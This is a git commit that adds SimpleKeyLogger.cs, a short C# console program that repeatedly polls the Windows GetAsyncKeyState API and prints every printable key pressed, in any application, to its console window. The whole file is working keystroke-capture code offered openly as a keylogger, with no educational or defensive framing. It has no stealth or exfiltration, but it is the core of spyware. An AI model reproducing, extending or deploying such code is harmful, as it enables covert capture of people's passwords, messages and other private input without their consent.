c9a8bb34150065e514e42508dfe304a4bbc0799e
Munnoch <60885813+Munnoch@users.noreply.github.com>
2021-07-23 22:26:15 +0100

    Add files via upload
    Console application in C#

---
+++ SimpleKeyLogger.cs
@@ -0,0 +1,28 @@
+﻿using System;
+using System.Runtime.InteropServices;
+using System.Threading;
+
+namespace Keylogger
+{
+    class SimpleKeyLogger
+    {
+        [DllImport("user32.dll")]
+        public static extern int GetAsyncKeyState(Int32 i);
+        static void Main(string[] args)
+        {
+            Console.WriteLine("Start");
+            while (true)
+            {
+                Thread.Sleep(5);
+                for (int i = 32; i < 127; i++)
+                {
+                    int keyState = GetAsyncKeyState(i);
+                    if (keyState == 32769)
+                    {
+                        Console.Write((char)i);
+                    }
+                }
+            }
+        }
+    }
+}
